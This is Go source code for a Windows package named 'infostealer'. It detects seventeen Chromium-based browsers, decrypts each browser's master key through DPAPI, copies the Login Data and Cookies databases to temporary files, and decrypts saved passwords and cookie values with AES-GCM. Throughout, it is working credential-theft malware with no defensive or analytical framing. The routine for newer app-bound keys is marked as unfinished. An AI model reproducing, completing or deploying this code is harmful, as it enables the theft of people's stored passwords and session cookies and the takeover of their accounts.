//go:build windows

package infostealer

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand/v2"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	_ "modernc.org/sqlite"
)

var localAppdata = os.Getenv("LOCALAPPDATA")

var supportedBrowsers = []struct {
	Name    string
	Path    string
	Process string
}{
	{"Chrome", filepath.Join(localAppdata, "Google", "Chrome"), "chrome.exe"},
	{"Edge", filepath.Join(localAppdata, "Microsoft", "Edge"), "msedge.exe"},
	{"Opera", filepath.Join(localAppdata, "Opera Software", "Opera Stable"), "opera.exe"},
	{"Opera GX", filepath.Join(localAppdata, "Opera Software", "Opera GX Stable"), "opera.exe"},
	{"Brave", filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser"), "brave.exe"},
	{"Vivaldi", filepath.Join(localAppdata, "Vivaldi"), "vivaldi.exe"},
	{"Arc", filepath.Join(localAppdata, "Packages", "TheBrowserCompany.Arc_ttlap7aakyb4", "LocalCache", "Local", "Arc"), "Arc.exe"},
	{"Yandex", filepath.Join(localAppdata, "Yandex", "YandexBrowser"), "browser.exe"},
	{"CocCoc", filepath.Join(localAppdata, "CocCoc", "Browser"), "browser.exe"},
	{"Cent", filepath.Join(localAppdata, "CentBrowser"), "chrome.exe"},
	{"Comodo Dragon", filepath.Join(localAppdata, "Comodo", "Dragon"), "dragon.exe"},
	{"Iridium", filepath.Join(localAppdata, "Iridium"), "iridium.exe"},
	{"7Star", filepath.Join(localAppdata, "7Star", "7Star"), "7star.exe"},
	{"Epic Privacy", filepath.Join(localAppdata, "Epic Privacy Browser"), "epic.exe"},
	{"Uran", filepath.Join(localAppdata, "uCozMedia", "Uran"), "uran.exe"},
	{"UC Browser", filepath.Join(localAppdata, "UCBrowser"), "UCBrowser.exe"},
	{"QQ Browser", filepath.Join(localAppdata, "Tencent", "QQBrowser"), "QQBrowser.exe"},
}

type users struct {
	Name      string
	Passwords []password
	Cookies   []cookie
}

type password struct {
	Site     string
	Username string
	Password string
}

type cookie struct {
	Name   string
	Domain string
	Value  string
}

type localState struct {
	OsCrypt struct {
		EncryptedKey          string `json:"encrypted_key"`
		AppBoundEncryptionKey string `json:"app_bound_encrypted_key"`
	} `json:"os_crypt"`
}

type blob struct {
	cbData uint32
	pbData *byte
}

func (state *localState) decryptKey(localpath string, processname string, keytype string) []byte {
	var in blob
	var out blob
	if keytype == "v10" {
		decoded, _ := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
		var newkey = decoded[5:]
		in = blob{
			cbData: uint32(len(newkey)),
			pbData: &newkey[0],
		}
		windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	} else if keytype == "v20" {
		decoded, _ := base64.StdEncoding.DecodeString(state.OsCrypt.AppBoundEncryptionKey)
		fmt.Printf("[DEBUG] DPAPI failed, attempting V20 decryption path\n")
		return /*decryptV20Key(decoded, localpath, processname) [IN DEVELOPMENT AND DOESENT WORK AS OF NOW]*/ nil
	}

	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)

	fmt.Printf("[DEBUG] Successfully decrypted Master Key via DPAPI\n")
	return key
}

type browserData struct {
	Name        string
	Localpath   string
	ProcessName string
	Users       []users
	Key         []byte
	AppBoundKey []byte
}

func (browser *browserData) detectUsers() {
	var userdata string
	if _, err := os.Stat(filepath.Join(browser.Localpath, "User Data")); err == nil {
		userdata = filepath.Join(browser.Localpath, "User Data")
	} else {
		userdata = browser.Localpath
	}

	fmt.Printf("[DEBUG] Scanning for profiles in: %s\n", userdata)
	dirs, _ := os.ReadDir(userdata)
	for _, dir := range dirs {
		if dir.IsDir() {
			prefPath := filepath.Join(userdata, dir.Name(), "Preferences")
			if _, err := os.Stat(prefPath); err == nil {
				fmt.Printf("[DEBUG] Found profile: %s\n", dir.Name())
				userstruct := users{
					Name: dir.Name(),
				}
				browser.Users = append(browser.Users, userstruct)
			}
		}
	}
}

func decrypt(encrypted []byte, key []byte) (string, error) {
	if len(encrypted) < 28 {
		return "", errors.New("invalid length")
	}

	nonce := encrypted[:12]
	rawpasswd := encrypted[12:]

	block, e := aes.NewCipher(key)
	if e != nil {
		return "", e
	}

	gcm, e := cipher.NewGCM(block)
	if e != nil {
		return "", e
	}

	plaintext, e := gcm.Open(nil, nonce, rawpasswd, nil)
	if e != nil {
		return "", e
	}

	return string(plaintext), nil
}

func randomstring(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	str := make([]byte, length)
	for i := range str {
		str[i] = charset[rand.IntN(len(charset))]
	}
	return string(str)
}

func (browser *browserData) getPasswords() {
	for i, user := range browser.Users {
		loginPath := filepath.Join(browser.Localpath, "User Data", user.Name, "Login Data")
		var file, err = os.ReadFile(loginPath)
		if err != nil {
			loginPath = filepath.Join(browser.Localpath, user.Name, "Login Data")
			file, _ = os.ReadFile(loginPath)
		}
		if len(file) == 0 {
			continue
		}

		filename := filepath.Join(os.TempDir(), randomstring(10))
		os.WriteFile(filename, file, 0600)
		db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
		if err != nil {
			fmt.Printf("[DEBUG] Failed to open sqlite DB for %s: %v\n", user.Name, err)
			os.Remove(filename)
			continue
		}

		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
		if rows == nil {
			fmt.Printf("[DEBUG] No login rows found for %s\n", user.Name)
			db.Close()
			os.Remove(filename)
			continue
		}

		count := 0
		for rows.Next() {
			var creds password
			var encryptedpass []byte
			rows.Scan(&creds.Site, &creds.Username, &encryptedpass)
			if bytes.HasPrefix(encryptedpass, []byte("v10")) {
				creds.Password, _ = decrypt(encryptedpass[3:], browser.Key)
			} else if bytes.HasPrefix(encryptedpass, []byte("v20")) {
				creds.Password, _ = decrypt(encryptedpass[3:], browser.Key)
			}
			browser.Users[i].Passwords = append(browser.Users[i].Passwords, creds)
			count++
		}
		fmt.Printf("[DEBUG] Extracted %d passwords from profile %s\n", count, user.Name)
		db.Close()
		rows.Close()
		os.Remove(filename)
	}
}

func (browser *browserData) getCookies() {
	for i, user := range browser.Users {
		cookiePath := filepath.Join(browser.Localpath, "User Data", user.Name, "Network", "Cookies")
		var file, err = os.ReadFile(cookiePath)
		if err != nil {
			cookiePath = filepath.Join(browser.Localpath, user.Name, "Network", "Cookies")
			file, _ = os.ReadFile(cookiePath)
		}
		if len(file) == 0 {
			continue
		}

		filename := filepath.Join(os.TempDir(), randomstring(10))
		os.WriteFile(filename, file, 0600)
		db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
		if err != nil {
			os.Remove(filename)
			continue
		}

		rows, _ := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
		if rows == nil {
			db.Close()
			os.Remove(filename)
			continue
		}

		count := 0
		for rows.Next() {
			var cookies cookie
			var encryptedvalue []byte
			rows.Scan(&cookies.Domain, &cookies.Name, &encryptedvalue)
			if bytes.HasPrefix(encryptedvalue, []byte("v10")) {
				cookies.Value, _ = decrypt(encryptedvalue[3:], browser.Key)
			} else if bytes.HasPrefix(encryptedvalue, []byte("v20")) {
				cookies.Value, _ = decrypt(encryptedvalue[3:], browser.AppBoundKey)
			}
			browser.Users[i].Cookies = append(browser.Users[i].Cookies, cookies)
			count++
		}
		fmt.Printf("[DEBUG] Extracted %d cookies from profile %s\n", count, user.Name)
		db.Close()
		rows.Close()
		os.Remove(filename)
	}
}

type BrowserList []browserData

func (browsers *BrowserList) add(name string, localpath string, processname string) {
	browser := browserData{
		Name:        name,
		Localpath:   localpath,
		ProcessName: processname,
	}
	*browsers = append(*browsers, browser)
}

func (browser *browserData) getLocalState() localState {
	statePath := filepath.Join(browser.Localpath, "User Data", "Local State")
	var file, err = os.ReadFile(statePath)
	if err != nil {
		statePath = filepath.Join(browser.Localpath, "Local State")
		file, _ = os.ReadFile(statePath)
	}
	var state localState
	json.Unmarshal(file, &state)
	return state
}

func (browsers *BrowserList) populate() {
	for i, browser := range *browsers {
		fmt.Printf("[DEBUG] Processing browser: %s\n", browser.Name)
		state := browser.getLocalState()
		if state.OsCrypt.EncryptedKey != "" {
			(*browsers)[i].Key = state.decryptKey(browser.Localpath, browser.ProcessName, "v10")
		}
		if state.OsCrypt.AppBoundEncryptionKey != "" {
			(*browsers)[i].AppBoundKey = state.decryptKey(browser.Localpath, browser.ProcessName, "v20")
		}

		if (*browsers)[i].Key == nil {
			fmt.Printf("[DEBUG] Could not retrieve key for %s, skipping data extraction\n", browser.Name)
			continue
		}

		(*browsers)[i].detectUsers()
		(*browsers)[i].getPasswords()
		(*browsers)[i].getCookies()
	}
}

func (browsers *BrowserList) detectBrowsers() {
	for _, browser := range supportedBrowsers {
		if exists, e := os.Stat(browser.Path); e == nil && exists.IsDir() {
			fmt.Printf("[DEBUG] Detected browser: %s at %s\n", browser.Name, browser.Path)
			browsers.add(browser.Name, browser.Path, browser.Process)
		}
	}
}

func Chromium() BrowserList {
	fmt.Printf("[DEBUG] Starting Chromium scan...\n")
	var browsers BrowserList
	browsers.detectBrowsers()
	browsers.populate()
	fmt.Printf("[DEBUG] Chromium scan finished\n")
	return browsers
}
